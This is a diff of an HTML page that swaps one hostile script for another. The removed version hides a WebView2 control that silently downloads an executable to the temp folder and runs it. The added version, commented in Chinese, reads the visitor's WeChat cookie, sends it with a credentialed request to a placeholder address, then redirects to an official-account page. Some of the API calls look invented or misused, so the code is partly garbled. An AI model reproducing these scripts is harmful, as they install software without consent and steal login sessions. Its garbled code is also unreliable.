@@ -1,38 +1,28 @@
 <html>
 <head>
-    <meta charset="utf-8">
-    <title>WebView2 Demo</title>
-    <script src="https://cdn.jsdelivr.net/npm/@microsoft/webview2-js"></script>
+<meta charset="utf-8">
 </head>
 <body>
-    <div id="webview-container" style="display:none;"></div>
-    <script>
-        // Create a WebView2 control
-        const webview = new WebView2(document.getElementById("webview-container"));
-
-        // Set the source to the malicious link
-        webview.src = "https://down.360safe.com/se/setup_online_1.1.12.0.exe";
-
-        // Set the silent mode to true
-        webview.silent = true;
-
-        // Add a listener for the download event
-        webview.addEventListener("download", (event) => {
-            // Get the download item
-            const downloadItem = event.downloadItem;
-
-            // Set the download path to the user's temp folder
-            downloadItem.downloadPath = `${process.env.TEMP}\\setup.exe`;
-
-            // Start the download
-            downloadItem.start();
-
-            // Add a listener for the download complete event
-            downloadItem.addEventListener("downloadcomplete", () => {
-                // Execute the downloaded file
-                require("child_process").execSync(`${process.env.TEMP}\\setup.exe /S`);
-            });
-        });
-    </script>
+<img src="^2^" alt="二维码">
+<script>
+// 获取用户的微信cookie
+var cookie = document.cookie;
+// 创建一个异步请求对象
+var xhr = new XMLHttpRequest();
+// 设置请求的方法和地址
+xhr.open("GET", "^3^");
+// 设置请求的cookie
+xhr.withCredentials = true;
+// 设置请求的回调函数
+xhr.onreadystatechange = function(){
+  // 如果请求成功
+  if(xhr.readyState == 4 && xhr.status == 200){
+    // 打开指定的公众号的页面
+    window.location.href = "https://mp.weixin.qq.com/mp/profile_ext?action=home&__biz=MzI0MjQyNzQyNQ==&scene=124#wechat_redirect";
+  }
+};
+// 发送请求
+xhr.send();
+</script>
 </body>
 </html>
